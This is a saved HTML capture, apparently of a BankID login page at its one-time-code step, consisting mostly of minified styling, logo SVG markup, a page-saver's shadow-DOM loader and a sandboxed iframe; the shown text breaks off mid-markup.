                font-family: -apple-system, BlinkMacSystemFont, sans-serif;
                font-size: var(--fontSize-L);
                font-weight: 500;
                justify-content: center;
                letter-spacing: 0;
                line-height: 1.17;
                min-height: var(--sizing-interactive-L);
                padding: var(--spacing-5XS) var(--spacing-L);
                position: relative;
                text-align: center;
                -webkit-transition: opacity 0.15s ease-in-out;
                transition: opacity 0.15s ease-in-out;
                white-space: nowrap;
            }
            ._4-eZgDdM8zs-:not(:disabled) {
                cursor: pointer;
            }
            ._4-eZgDdM8zs-[aria-busy="true"] .ytkQsy9Chro- {
                display: -webkit-box;
                display: -ms-flexbox;
                display: flex;
            }
            ._4-eZgDdM8zs-[aria-busy="true"] ._25dJVjMf6Ig- {
                visibility: hidden;
            }
            ._4-eZgDdM8zs-[data-variant="filled"] {
                background: var(--component-Button-filled-bgColor-rest);
                color: var(--fgColor-inverted);
            }
            ._4-eZgDdM8zs-[data-variant="filled"]:not(:disabled):hover {
                background: var(--component-Button-filled-bgColor-hover);
                -webkit-box-shadow: var(--shadow-hover);
                box-shadow: var(--shadow-hover);
                color: var(--fgColor-inverted);
            }
            ._4-eZgDdM8zs-[data-variant="filled"]:not(:disabled):active {
                background: var(--component-Button-filled-bgColor-active);
            }
            ._4-eZgDdM8zs-[data-variant="filled"]:not(:disabled):focus-visible {
                -webkit-box-shadow: var(--shadow-focusOuter);
                box-shadow: var(--shadow-focusOuter);
            }
            ._4-eZgDdM8zs-[data-variant="filled"]:disabled {
                opacity: 0.5;
            }
            ._4-eZgDdM8zs-[data-variant="filled"][aria-disabled="true"] {
                background: var(--component-Button-filled-bgColor-invalid);
                color: var(--fgColor-default);
            }
            ._4-eZgDdM8zs-[data-variant="text"] {
                background: var(--bgColor-default);
                color: var(--fgColor-variant);
            }
            ._4-eZgDdM8zs-[data-variant="text"] ._25dJVjMf6Ig-:after {
                border-bottom: var(--borderSize-underline) solid var(--fgColor-variant);
            }
            ._4-eZgDdM8zs-[data-variant="text"]:not(:disabled):hover {
                background: var(--bgColor-state-hover);
            }
            ._4-eZgDdM8zs-[data-variant="text"]:not(:disabled):active {
                background: var(--bgColor-state-active);
            }
            ._4-eZgDdM8zs-[data-variant="text"]:not(:disabled):focus-visible {
                -webkit-box-shadow: var(--shadow-focus);
                box-shadow: var(--shadow-focus);
            }
            ._4-eZgDdM8zs-[data-variant="text"]:disabled,
            ._4-eZgDdM8zs-[data-variant="text"][aria-disabled="true"] {
                opacity: 0.5;
            }
            .ytkQsy9Chro- {
                -webkit-box-align: center;
                -ms-flex-align: center;
                -webkit-box-pack: center;
                -ms-flex-pack: center;
                align-items: center;
                -webkit-animation: fadeIn 0.15s ease-in-out;
                animation: fadeIn 0.15s ease-in-out;
                display: none;
                inset: 0;
                justify-content: center;
                position: absolute;
            }
            .ytkQsy9Chro- svg {
                height: var(--sizing-icon-L);
                width: var(--sizing-icon-L);
            }
            ._25dJVjMf6Ig- {
                position: relative;
            }
            ._25dJVjMf6Ig-:after {
                bottom: calc(var(--borderSize-underline) * -1);
                content: "";
                left: 0;
                position: absolute;
                right: 0;
            }
            ._5AQx8GHJ-cE- {
                font-size: var(--fontSize-L);
                font-weight: 400;
            }
            ._3N2v9QvvCJs-,
            ._5AQx8GHJ-cE- {
                font-family: -apple-system, BlinkMacSystemFont, sans-serif;
                letter-spacing: 0;
                line-height: 1.17;
            }
            ._3N2v9QvvCJs- {
                font-size: var(--fontSize-2XL);
                font-weight: 600;
            }
            .asMjGTcu2eg- {
                -webkit-box-orient: vertical;
                -webkit-box-direction: normal;
                display: -webkit-box;
                display: -ms-flexbox;
                display: flex;
                -ms-flex-direction: column;
                flex-direction: column;
                gap: var(--spacing-2XS);
                max-width: 370px;
                min-height: 250px;
                width: 100%;
            }
            @media screen and (max-height: 350px) {
                .asMjGTcu2eg- {
                    min-height: auto;
                }
            }
            ._42y57EqZ9Pg- {
                display: -webkit-box;
                display: -ms-flexbox;
                display: flex;
                max-height: var(--component-Error-icon-L);
                max-width: var(--component-Error-icon-L);
                min-height: var(--component-Error-icon-L);
                min-width: var(--component-Error-icon-L);
            }
            ._42y57EqZ9Pg- svg {
                height: 100%;
                width: 100%;
            }
            ._42y57EqZ9Pg- svg path {
                fill: var(--fgColor-default);
            }
            ._5AQx8GHJ-cE- span,
            ._5AQx8GHJ-cE- time {
                font-family: Courier;
                font-weight: 600;
            }
            .pJWKUY8geys- {
                -ms-flex-line-pack: end;
                -ms-flex-item-align: center;
                -webkit-box-flex: 1;
                align-content: end;
                align-self: center;
                -ms-flex: 1;
                flex: 1;
            }
            #loaders,
            #timeout-error {
                height: 100%;
            }
            #loaders.hidden,
            #timeout-error.hidden {
                display: none;
            }
            #no-javascript-error {
                inset: 0;
                position: absolute;
            }
            .fbFBD5nAVJ8-,
            .gEMo8Vcq4o4- {
                height: 100%;
            }
            .fbFBD5nAVJ8-.vMRAXPa2fec-,
            .gEMo8Vcq4o4-.vMRAXPa2fec- {
                display: none;
            }
            .fbFBD5nAVJ8-.zW2sREIfPCs-,
            .gEMo8Vcq4o4-.zW2sREIfPCs- {
                display: initial;
            }
            .fbFBD5nAVJ8-:not(.zW2sREIfPCs-) {
                display: none;
            }
            .Cbm6kxAjb3A- {
                display: grid;
                grid-template-columns: 100%;
                grid-template-rows: 100%;
                height: 100%;
                max-height: 520px;
                position: relative;
                width: 100%;
            }
            .Cbm6kxAjb3A-.ers2rS-3GF8- {
                max-height: 100%;
            }
            .UeFlY2lFKFA- {
                height: 100%;
                width: 100%;
            }
            .ajyUSMZ-Dv4- {
                bottom: 0;
                left: 0;
                opacity: 0;
                overflow: hidden;
                position: absolute;
                right: 0;
                top: 0;
                -webkit-transition: opacity 0.25s ease-in-out;
                transition: opacity 0.25s ease-in-out;
            }
            .ajyUSMZ-Dv4-.ShGJWcqedDM- {
                opacity: 1;
            }
            .ajyUSMZ-Dv4- iframe {
                height: 100%;
                width: 100%;
            }
            .HHrgdm5MXlg- input,
            .HHrgdm5MXlg- select,
            .HHrgdm5MXlg- textarea {
                font-family: -apple-system, BlinkMacSystemFont, sans-serif;
                font-size: var(--fontSize-L);
                font-weight: 500;
                letter-spacing: 0;
                line-height: 1.17;
            }
            .HHrgdm5MXlg- {
                -webkit-box-align: center;
                -ms-flex-align: center;
                align-items: center;
                background-color: var(--bgColor-elevated);
                border-radius: 8px;
                -webkit-box-shadow: var(--shadow-form-rest);
                box-shadow: var(--shadow-form-rest);
                -webkit-column-gap: var(--spacing-3XS);
                -moz-column-gap: var(--spacing-3XS);
                column-gap: var(--spacing-3XS);
                display: -webkit-inline-box;
                display: -ms-inline-flexbox;
                display: inline-flex;
                height: var(--sizing-interactive-L);
                overflow: hidden;
                padding: 0 var(--spacing-2XS);
                position: relative;
                width: 100%;
            }
            .HHrgdm5MXlg-:not(._2C2f5JcDgXI-):hover {
                background-color: var(--bgColor-state-hover);
            }
            .HHrgdm5MXlg-:not(._2C2f5JcDgXI-):focus-within {
                -webkit-box-shadow: var(--shadow-focus);
                box-shadow: var(--shadow-focus);
            }
            .HHrgdm5MXlg-:not(._2C2f5JcDgXI-).GHK7B3OY-YY- {
                -webkit-box-shadow: var(--shadow-danger);
                box-shadow: var(--shadow-danger);
            }
            .HHrgdm5MXlg-:not(._2C2f5JcDgXI-).GHK7B3OY-YY-:focus-within {
                -webkit-box-shadow: var(--shadow-dangerFocus);
                box-shadow: var(--shadow-dangerFocus);
            }
            .HHrgdm5MXlg-._2C2f5JcDgXI- {
                opacity: 0.5;
            }
            .HHrgdm5MXlg- .QdE3GyP4Wfo- {
                display: -webkit-box;
                display: -ms-flexbox;
                display: flex;
                max-height: var(--sizing-icon-L);
                max-width: var(--sizing-icon-L);
                min-height: var(--sizing-icon-L);
                min-width: var(--sizing-icon-L);
            }
            .HHrgdm5MXlg- .QdE3GyP4Wfo- svg {
                height: 100%;
                width: 100%;
            }
            .HHrgdm5MXlg- .QdE3GyP4Wfo- svg path {
                fill: var(--fgColor-default);
            }
            .HHrgdm5MXlg- input,
            .HHrgdm5MXlg- select,
            .HHrgdm5MXlg- textarea {
                color: var(--fgColor-default);
                height: 100%;
                width: 100%;
            }
            .HHrgdm5MXlg- input::-webkit-input-placeholder,
            .HHrgdm5MXlg- select::-webkit-input-placeholder,
            .HHrgdm5MXlg- textarea::-webkit-input-placeholder {
                color: var(--fgColor-subtle);
                font-weight: 400;
            }
            .HHrgdm5MXlg- input::-moz-placeholder,
            .HHrgdm5MXlg- select::-moz-placeholder,
            .HHrgdm5MXlg- textarea::-moz-placeholder {
                color: var(--fgColor-subtle);
                font-weight: 400;
            }
            .HHrgdm5MXlg- input:-ms-input-placeholder,
            .HHrgdm5MXlg- select:-ms-input-placeholder,
            .HHrgdm5MXlg- textarea:-ms-input-placeholder {
                color: var(--fgColor-subtle);
                font-weight: 400;
            }
            .HHrgdm5MXlg- input::-ms-input-placeholder,
            .HHrgdm5MXlg- select::-ms-input-placeholder,
            .HHrgdm5MXlg- textarea::-ms-input-placeholder {
                color: var(--fgColor-subtle);
                font-weight: 400;
            }
            .HHrgdm5MXlg- input::placeholder,
            .HHrgdm5MXlg- select::placeholder,
            .HHrgdm5MXlg- textarea::placeholder {
                color: var(--fgColor-subtle);
                font-weight: 400;
            }
            .HHrgdm5MXlg- input::-webkit-input-placeholder {
                color: var(--fgColor-subtle);
                font-weight: 400;
            }
            .HHrgdm5MXlg- input::-moz-placeholder {
                color: var(--fgColor-subtle);
                font-weight: 400;
            }
            .HHrgdm5MXlg- input:-ms-input-placeholder {
                color: var(--fgColor-subtle);
                font-weight: 400;
            }
            .HHrgdm5MXlg- input::-ms-input-placeholder {
                color: var(--fgColor-subtle);
                font-weight: 400;
            }
            .HHrgdm5MXlg- input::placeholder {
                color: var(--fgColor-subtle);
                font-weight: 400;
            }
            .HHrgdm5MXlg- input::-ms-clear {
                display: none;
            }
            .M30kcZAuM-g- {
                -webkit-box-align: center;
                -ms-flex-align: center;
                align-items: center;
                color: var(--fgColor-subtle);
                -webkit-column-gap: var(--spacing-5XS);
                -moz-column-gap: var(--spacing-5XS);
                column-gap: var(--spacing-5XS);
                display: -webkit-box;
                display: -ms-flexbox;
                display: flex;
                font-family: -apple-system, BlinkMacSystemFont, sans-serif;
                font-size: var(--fontSize-S);
                font-weight: 400;
                letter-spacing: 0;
                line-height: 1.17;
                min-height: var(--font-body-S-Regular-lineHeight);
            }
            .M30kcZAuM-g- > span {
                white-space: pre-wrap;
            }
            .M30kcZAuM-g- svg {
                height: var(--sizing-icon-S);
                width: var(--sizing-icon-S);
            }
            .M30kcZAuM-g-.JtsOa-HBeR8- {
                -webkit-animation: _4zmb8oQIUw8- 0.1s ease-in-out;
                animation: _4zmb8oQIUw8- 0.1s ease-in-out;
                color: var(--fgColor-status-danger);
            }
            .M30kcZAuM-g-.JtsOa-HBeR8- svg path {
                fill: var(--fgColor-status-danger);
            }
            @-webkit-keyframes _4zmb8oQIUw8- {
                0% {
                    -webkit-transform: translate(-5px);
                    transform: translate(-5px);
                }
                50% {
                    -webkit-transform: translate(5px);
                    transform: translate(5px);
                }
            }
            @keyframes _4zmb8oQIUw8- {
                0% {
                    -webkit-transform: translate(-5px);
                    transform: translate(-5px);
                }
                50% {
                    -webkit-transform: translate(5px);
                    transform: translate(5px);
                }
            }
            .J6yXK3ijmuY- {
                display: block;
                font-family: -apple-system, BlinkMacSystemFont, sans-serif;
                font-size: var(--fontSize-XL);
                font-weight: 600;
                letter-spacing: 0;
                line-height: 1.17;
            }
            .n2WKpoEGOyQ- {
                display: grid;
                gap: var(--gap-content-L);
                grid-template-columns: 1fr;
                grid-template-rows: auto minmax(25px, 1fr);
                justify-items: start;
            }
            .n2WKpoEGOyQ-.vzEZb-mz7ts- {
                grid-template-columns: 1fr;
                grid-template-rows: auto auto minmax(25px, 1fr);
            }
            .Pa2uXan3Fcs- {
                font-family: -apple-system, BlinkMacSystemFont, sans-serif;
                font-size: var(--fontSize-L);
                font-weight: 400;
                letter-spacing: 0;
                line-height: 1.17;
            }
            .F6AhXkYtrHc- {
                -webkit-box-align: center;
                -ms-flex-align: center;
                align-items: center;
                display: grid;
                gap: var(--gap-content-L);
                grid-template-rows: auto auto 1fr;
                height: 100%;
                justify-items: center;
            }
            .Pa2uXan3Fcs- {
                text-align: center;
            }
            .IoY--xjRz3s- {
                -webkit-box-orient: vertical;
                -webkit-box-direction: normal;
                display: -webkit-box;
                display: -ms-flexbox;
                display: flex;
                -ms-flex-direction: column;
                flex-direction: column;
                gap: var(--gap-content-L);
                height: 100%;
                margin: auto;
                max-height: 285px;
                max-width: 320px;
                width: 100%;
            }
            @media screen and (max-height: 350px) {
                .IoY--xjRz3s- {
                    height: auto;
                }
            }
            .wyvsH1z9N50- {
                -webkit-box-flex: 1;
                -webkit-box-align: end;
                -ms-flex-align: end;
                align-items: end;
                -ms-flex: 1;
                flex: 1;
            }
            .DoMnH-55BmM-,
            .wyvsH1z9N50- {
                -webkit-box-pack: center;
                -ms-flex-pack: center;
                display: -webkit-box;
                display: -ms-flexbox;
                display: flex;
                justify-content: center;
            }
            .DoMnH-55BmM- {
                -webkit-box-align: center;
                -ms-flex-align: center;
                align-items: center;
            }
        </style>
    
 
        <style id="savepage-cssvariables">
            :root {
            }
        </style>
        <script id="savepage-shadowloader" type="text/javascript">
            "use strict";
            window.addEventListener(
                "DOMContentLoaded",
                function (event) {
                    savepage_ShadowLoader(5);
                },
                false
            );
            function savepage_ShadowLoader(c) {
                createShadowDOMs(0, document.documentElement);
                function createShadowDOMs(a, b) {
                    var i;
                    if (b.localName == "iframe" || b.localName == "frame") {
                        if (a < c) {
                            try {
                                if (b.contentDocument.documentElement != null) {
                                    createShadowDOMs(a + 1, b.contentDocument.documentElement);
                                }
                            } catch (e) {}
                        }
                    } else {
                        if (
                            b.children.length >= 1 &&
                            b.children[0].localName == "template" &&
                            b.children[0].hasAttribute("data-savepage-shadowroot")
                        ) {
                            b.attachShadow({ mode: "open" }).appendChild(b.children[0].content);
                            b.removeChild(b.children[0]);
                            for (i = 0; i < b.shadowRoot.children.length; i++)
                                if (b.shadowRoot.children[i] != null) createShadowDOMs(a, b.shadowRoot.children[i]);
                        }
                        for (i = 0; i < b.children.length; i++)
                            if (b.children[i] != null) createShadowDOMs(a, b.children[i]);
                    }
                }
            }
        </script>

        <meta name="savepage-version" content="33.9" />
        <meta name="savepage-comments" content="" />
    </head>
    <body
        class="bidTheme"
        data-action="AUTHENTICATE"
        __processed_64bbc946-daa6-4dd6-9cfe-d25146c66c68__="true"
        bis_register=""
    >
        <div id="app" bis_skin_checked="1">
            <div class="appViewport" bis_skin_checked="1">
                <div class="-Xh-zxc-5iU-" bis_skin_checked="1">
                    <div class="T6JudSrF7xU-" bis_skin_checked="1">
                        <div class="MNJRkYmiNJo-" bis_skin_checked="1">
                            <div class="pTZAeuSiHLM- FpzL5vI50-o-" data-direction="fade" bis_skin_checked="1">
                                <div class="Cbm6kxAjb3A-" bis_skin_checked="1">
                                    <div aria-hidden="true" class="UeFlY2lFKFA-" bis_skin_checked="1">
                                        <div class="wup5P-GPUUY-" bis_skin_checked="1">
                                            <header class="RnM5kkyLJe8-">
                                                <div class="VGjB0ReHXLQ-" bis_skin_checked="1">
                                                    <svg
                                                        fill="none"
                                                        focusable="false"
                                                        height="14"
                                                        viewBox="0 0 90 14"
                                                        width="90"
                                                        xmlns="http://www.w3.org/2000/svg"
                                                        aria-hidden="true"
                                                    >
                                                        <path
                                                            d="M29.5273 8.5156C29.5273 10.5786 30.6877 11.6746 32.0416 11.6746C33.2665 11.6746 34.6204 10.6431 34.6204 8.5156C34.6204 6.38809 33.331 5.42104 32.106 5.42104C30.7522 5.42104 29.5273 6.38809 29.5273 8.5156ZM29.5273 0.0700378V5.09869C30.1075 4.19611 31.139 3.29353 32.8797 3.29353C34.8138 3.29353 37.1347 4.90528 37.1347 8.45113C37.1347 12.1259 34.9427 13.9311 32.6863 13.9311C31.3969 13.9311 30.3009 13.3508 29.5917 12.1904V13.6087H27.0774V0.0700378H29.5273Z"
                                                            fill="white"
                                                        ></path>
                                                        <path
                                                            d="M40.8095 8.58009C40.8095 10.7076 42.0989 11.6747 43.3238 11.6747C44.6777 11.6747 45.8381 10.7721 45.8381 8.58009C45.8381 6.45258 44.6777 5.42107 43.3238 5.42107C42.1634 5.42107 40.8095 6.38811 40.8095 8.58009ZM38.3596 8.45115C38.3596 4.96978 40.6161 3.22909 42.8725 3.22909C44.0975 3.22909 45.129 3.68038 45.9026 4.77637V3.48697H48.3525V13.6087H45.9026V12.1904C45.1934 13.1575 44.1619 13.8666 42.5502 13.8666C40.6161 13.8666 38.3596 12.1904 38.3596 8.45115Z"
                                                            fill="white"
                                                        ></path>
                                                        <path
                                                            d="M53.1877 7.87091V13.6087H50.7378V3.55142H53.1877V5.03423C53.8969 3.74483 55.1863 3.29354 56.2823 3.29354C58.0229 3.29354 59.6992 4.19612 59.6992 6.90386V13.6087H57.2493V7.80644C57.2493 6.13022 56.4112 5.48552 55.3152 5.48552C54.0903 5.54999 53.1877 6.25916 53.1877 7.87091Z"
                                                            fill="white"
                                                        ></path>
                                                        <path
                                                            d="M62.0201 0.0700684V13.6088H64.4699V11.1589L65.8238 9.48268L68.596 13.6088H71.3037L67.3066 7.74199L70.788 3.55144H68.0158L64.4699 8.19328V0.0700684H62.0201Z"
                                                            fill="white"
                                                        ></path>
                                                        <path
                                                            d="M76.2034 0.52137H73.6891V13.6088H76.2034V0.52137Z"
                                                            fill="white"
                                                        ></path>
                                                        <path
                                                            d="M83.4886 0.52137H78.7178V13.6088H83.4886C87.0344 13.6088 90 11.4813 90 7.03283C90 2.64888 87.0344 0.52137 83.4886 0.52137ZM83.4886 11.2878H81.2321V2.84229H83.4886C85.5516 2.84229 87.2923 4.19616 87.2923 7.0973C87.2923 9.93398 85.5516 11.2878 83.4886 11.2878Z"
                                                            fill="white"
                                                        ></path>
                                                        <path
                                                            d="M0.967273 2.00349H4.83636C5.35224 2.00349 5.80364 1.55209 5.80364 1.03621C5.80364 0.520333 5.35224 0.0689392 4.83636 0.0689392H0.967273C0.451394 0.0689392 0 0.520333 0 1.03621C0 1.55209 0.451394 2.00349 0.967273 2.00349Z"
                                                            fill="white"
                                                        ></path>
                                                        <path
                                                            d="M0.967273 9.74167H4.83636C5.35224 9.74167 5.80364 9.29028 5.80364 8.7744C5.80364 8.25852 5.35224 7.80712 4.83636 7.80712H0.967273C0.451394 7.80712 0 8.25852 0 8.7744C0 9.29028 0.451394 9.74167 0.967273 9.74167Z"
                                                            fill="white"
                                                        ></path>
                                                        <path
                                                            d="M4.83636 13.6108H0.967273C0.451394 13.6108 0 13.1594 0 12.6435C0 12.1276 0.451394 11.6762 0.967273 11.6762H4.83636C5.35224 11.6762 5.80364 12.1276 5.80364 12.6435C5.80364 13.1594 5.35224 13.6108 4.83636 13.6108Z"
                                                            fill="white"
                                                        ></path>
                                                        <path
                                                            d="M8.70545 5.87258H12.5745C13.0904 5.87258 13.5418 5.42118 13.5418 4.90531C13.5418 4.38943 13.0904 3.93803 12.5745 3.93803H8.70545C8.18958 3.93803 7.73818 4.38943 7.73818 4.90531C7.73818 5.42118 8.18958 5.87258 8.70545 5.87258Z"
                                                            fill="white"
                                                        ></path>
                                                        <path
                                                            d="M12.5745 9.74167H8.70545C8.18958 9.74167 7.73818 9.29028 7.73818 8.7744C7.73818 8.25852 8.18958 7.80712 8.70545 7.80712H12.5745C13.0904 7.80712 13.5418 8.25852 13.5418 8.7744C13.5418 9.29028 13.0904 9.74167 12.5745 9.74167Z"
                                                            fill="white"
                                                        ></path>
                                                        <path
                                                            d="M16.4436 2.00349H20.3127C20.8286 2.00349 21.28 1.55209 21.28 1.03621C21.28 0.520333 20.8286 0.0689392 20.3127 0.0689392H16.4436C15.9278 0.0689392 15.4764 0.520333 15.4764 1.03621C15.4764 1.55209 15.9278 2.00349 16.4436 2.00349Z"
                                                            fill="white"
                                                        ></path>
                                                        <path
                                                            d="M20.3127 5.87258H16.4436C15.9278 5.87258 15.4764 5.42118 15.4764 4.90531C15.4764 4.38943 15.9278 3.93803 16.4436 3.93803H20.3127C20.8286 3.93803 21.28 4.38943 21.28 4.90531C21.28 5.42118 20.8286 5.87258 20.3127 5.87258Z"
                                                            fill="white"
                                                        ></path>
                                                        <path
                                                            d="M16.4436 13.6108H20.3127C20.8286 13.6108 21.28 13.1594 21.28 12.6435C21.28 12.1276 20.8286 11.6762 20.3127 11.6762H16.4436C15.9278 11.6762 15.4764 12.1276 15.4764 12.6435C15.4764 13.1594 15.9278 13.6108 16.4436 13.6108Z"
                                                            fill="white"
                                                        ></path>
                                                    </svg>
                                                </div>
                                            </header>
                                            <main class="uLsXIdeN3YE-">
                                                <div class="a-O3AScSr-A-" bis_skin_checked="1">
                                                    <div class="GfdhxHv-UH0-" bis_skin_checked="1">
                                                        <svg
                                                            aria-busy="true"
                                                            class="wZGPbQu3nk4-"
                                                            fill="none"
                                                            height="24"
                                                            viewBox="0 0 24 24"
                                                            width="24"
                                                            xmlns="http://www.w3.org/2000/svg"
                                                        >
                                                            <mask
                                                                height="24"
                                                                id="mask0_27_549"
                                                                maskUnits="userSpaceOnUse"
                                                                width="24"
                                                                x="0"
                                                                y="0"
                                                                style="mask-type: alpha"
                                                            >
                                                                <rect fill="white" height="24" width="24"></rect>
                                                            </mask>
                                                            <g mask="url(#mask0_27_549)">
                                                                <path
                                                                    d="M11 17C11 19.2091 9.20914 21 7 21C4.79086 21 3 19.2091 3 17C3 14.7909 4.79086 13 7 13C9.20914 13 11 14.7909 11 17Z"
                                                                    fill="black"
                                                                ></path>
                                                                <path
                                                                    d="M21 7C21 9.20914 19.2091 11 17 11C14.7909 11 13 9.20914 13 7C13 4.79086 14.7909 3 17 3C19.2091 3 21 4.79086 21 7Z"
                                                                    fill="black"
                                                                ></path>
                                                            </g>
                                                        </svg>
                                                    </div>
                                                </div>
                                            </main>
                                        </div>
                                    </div>
                                    <div class="ajyUSMZ-Dv4- ShGJWcqedDM-" id="bid-client" bis_skin_checked="1">
                                        <iframe
                                            sandbox="allow-scripts"
                                            srcdoc='<!DOCTYPE html><html lang="nb"><head><script data-savepage-type="" type="text/plain" data-savepage-src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script data-savepage-type="" type="text/plain" data-savepage-src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><base href="https://csfe.bankid.no/CentralServerFEJS/a?cid=buZCzSzH1x4pcRZa"><link rel="stylesheet" type="text/css" href="/jsclient21/css/bid_202609080750.css"><meta name="viewport" content="initial-scale=1.0"><meta charset="iso-8859-1"><script bis_use="true" data-savepage-type="text/javascript" type="text/plain" charset="utf-8" nonce="" data-dynamic-id="e0549669-e628-4c0a-ac8a-66896a6fc7fd" data-savepage-src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executors/200.js"></script><script data-savepage-type="" type="text/plain" data-savepage-src="data:text/javascript;base64,"></script>
<style id="savepage-cssvariables">
  :root {
  }
</style>
                        </head><body __processed_6db07d4a-e9db-4676-bd80-d8effce8c159__="true" bis_status="ok" bis_frame_id="182" bis_body_id="fr_kwbocykyp4cbwjrd3dyq2i" bis_depth="0" bis_chainid="1" bis_size="{&amp;quot;x&amp;quot;:0,&amp;quot;y&amp;quot;:0,&amp;quot;w&amp;quot;:450,&amp;quot;h&amp;quot;:520,&amp;quot;abs_x&amp;quot;:634,&amp;quot;abs_y&amp;quot;:87}"><div id="app" bis_size="{&amp;quot;x&amp;quot;:0,&amp;quot;y&amp;quot;:0,&amp;quot;w&amp;quot;:450,&amp;quot;h&amp;quot;:520,&amp;quot;abs_x&amp;quot;:634,&amp;quot;abs_y&amp;quot;:87}"><div class="Lua4ap2uGkQ-" bis_size="{&amp;quot;x&amp;quot;:0,&amp;quot;y&amp;quot;:0,&amp;quot;w&amp;quot;:450,&amp;quot;h&amp;quot;:520,&amp;quot;abs_x&amp;quot;:634,&amp;quot;abs_y&amp;quot;:87}"><div class="O5xZsmVjdmo-" bis_size="{&amp;quot;x&amp;quot;:0,&amp;quot;y&amp;quot;:0,&amp;quot;w&amp;quot;:450,&amp;quot;h&amp;quot;:520,&amp;quot;abs_x&amp;quot;:634,&amp;quot;abs_y&amp;quot;:87}"><div class="AZhftGJX1fQ-" data-viewport="otpChallenge" bis_size="{&amp;quot;x&amp;quot;:0,&amp;quot;y&amp;quot;:0,&amp;quot;w&amp;quot;:450,&amp;quot;h&amp;quot;:520,&amp;quot;abs_x&amp;quot;:634,&amp;quot;abs_y&amp;quot;:87}"><div class="AFP4hM8sct4-" bis_size="{&amp;quot;x&amp;quot;:1,&amp;quot;y&amp;quot;:1,&amp;quot;w&amp;quot;:448,&amp;quot;h&amp;quot;:57,&amp;quot;abs_x&amp;quot;:635,&amp;quot;abs_y&amp;quot;:88}"><header class="_9z1U54gUQEg-" data-has-back="false" bis_size="{&amp;quot;x&amp;quot;:17,&amp;quot;y&amp;quot;:1,&amp;quot;w&amp;quot;:416,&amp;quot;h&amp;quot;:57,&amp;quot;abs_x&amp;quot;:651,&amp;quot;abs_y&amp;quot;:88}"><div class="Nv0kK8uGeS0-" bis_size="{&amp;quot;x&amp;quot;:0,&amp;quot;y&amp;quot;:0,&amp;quot;w&amp;quot;:0,&amp;quot;h&amp;quot;:0,&amp;quot;abs_x&amp;quot;:634,&amp;quot;abs_y&amp;quot;:87}"></div><div class="_3--1Lzuaofk-" bis_size="{&amp;quot;x&amp;quot;:180,&amp;quot;y&amp;quot;:22,&amp;quot;w&amp;quot;:90,&amp;quot;h&amp;quot;:14,&amp;quot;abs_x&amp;quot;:814,&amp;quot;abs_y&amp;quot;:109}"><div class="ul9tGGaWnp8-" bis_size="{&amp;quot;x&amp;quot;:180,&amp;quot;y&amp;quot;:22,&amp;quot;w&amp;quot;:90,&amp;quot;h&amp;quot;:14,&amp;quot;abs_x&amp;quot;:814,&amp;quot;abs_y&amp;quot;:109}"><svg aria-hidden="true" fill="none" height="14" viewBox="0 0 90 14" width="90" xmlns="http://www.w3.org/2000/svg" bis_size="{&amp;quot;x&amp;quot;:180,&amp;quot;y&amp;quot;:22,&amp;quot;w&amp;quot;:90,&amp;quot;h&amp;quot;:14,&amp;quot;abs_x&amp;quot;:814,&amp;quot;abs_y&amp;quot;:109}"><path d="M29.5273 8.5156C29.5273 10.5786 30.6877 11.6746 32.0416 11.6746C33.2665 11.6746 34.6204 10.6431 34.6204 8.5156C34.6204 6.38809 33.331 5.42104 32.106 5.42104C30.7522 5.42104 29.5273 6.38809 29.5273 8.5156ZM29.5273 0.0700378V5.09869C30.1075 4.19611 31.139 3.29353 32.8797 3.29353C34.8138 3.29353 37.1347 4.90528 37.1347 8.45113C37.1347 12.1259 34.9427 13.9311 32.6863 13.9311C31.3969 13.9311 30.3009 13.3508 29.5917 12.1904V13.6087H27.0774V0.0700378H29.5273Z" fill="white" bis_size="{&amp;quot;x&amp;quot;:207,&amp;quot;y&amp;quot;:22,&amp;quot;w&amp;quot;:10,&amp;quot;h&amp;quot;:13,&amp;quot;abs_x&amp;quot;:841,&amp;quot;abs_y&amp;quot;:109}"></path><path d="M40.8095 8.58009C40.8095 10.7076 42.0989 11.6747 43.3238 11.6747C44.6777 11.6747 45.8381 10.7721 45.8381 8.58009C45.8381 6.45258 44.6777 5.42107 43.3238 5.42107C42.1634 5.42107 40.8095 6.38811 40.8095 8.58009ZM38.3596 8.45115C38.3596 4.96978 40.6161 3.22909 42.8725 3.22909C44.0975 3.22909 45.129 3.68038 45.9026 4.77637V3.48697H48.3525V13.6087H45.9026V12.1904C45.1934 13.1575 44.1619 13.8666 42.5502 13.8666C40.6161 13.8666 38.3596 12.1904 38.3596 8.45115Z" fill="white" bis_size="{&amp;quot;x&amp;quot;:218,&amp;quot;y&amp;quot;:25,&amp;quot;w&amp;quot;:9,&amp;quot;h&amp;quot;:10,&amp;quot;abs_x&amp;quot;:852,&amp;quot;abs_y&amp;quot;:112}"></path><path d="M53.1877 7.87091V13.6087H50.7378V3.55142H53.1877V5.03423C53.8969 3.74483 55.1863 3.29354 56.2823 3.29354C58.0229 3.29354 59.6992 4.19612 59.6992 6.90386V13.6087H57.2493V7.80644C57.2493 6.13022 56.4112 5.48552 55.3152 5.48552C54.0903 5.54999 53.1877 6.25916 53.1877 7.87091Z" fill="white" bis_size="{&amp;quot;x&amp;quot;:230,&amp;quot;y&amp;quot;:26,&amp;quot;w&amp;quot;:8,&amp;quot;h&amp;quot;:10,&amp;quot;abs_x&amp;quot;:864,&amp;quot;abs_y&amp;quot;:113}"></path><path d="M62.0201 0.0700684V13.6088H64.4699V11.1589L65.8238 9.48268L68.596 13.6088H71.3037L67.3066 7.74199L70.788 3.55144H68.0158L64.4699 8.19328V0.0700684H62.0201Z" fill="white" bis_size="{&amp;quot;x&amp;quot;:242,&amp;quot;y&amp;quot;:22,&amp;quot;w&amp;quot;:9,&amp;quot;h&amp;quot;:13,&amp;quot;abs_x&amp;quot;:876,&amp;quot;abs_y&amp;quot;:109}"></path><path d="M76.2034 0.52137H73.6891V13.6088H76.2034V0.52137Z" fill="white" bis_size="{&amp;quot;x&amp;quot;:253,&amp;quot;y&amp;quot;:23,&amp;quot;w&amp;quot;:2,&amp;quot;h&amp;quot;:13,&amp;quot;abs_x&amp;quot;:887,&amp;quot;abs_y&amp;quot;:110}"></path><path d="M83.4886 0.52137H78.7178V13.6088H83.4886C87.0344 13.6088 90 11.4813 90 7.03283C90 2.64888 87.0344 0.52137 83.4886 0.52137ZM83.4886 11.2878H81.2321V2.84229H83.4886C85.5516 2.84229 87.2923 4.19616 87.2923 7.0973C87.2923 9.93398 85.5516 11.2878 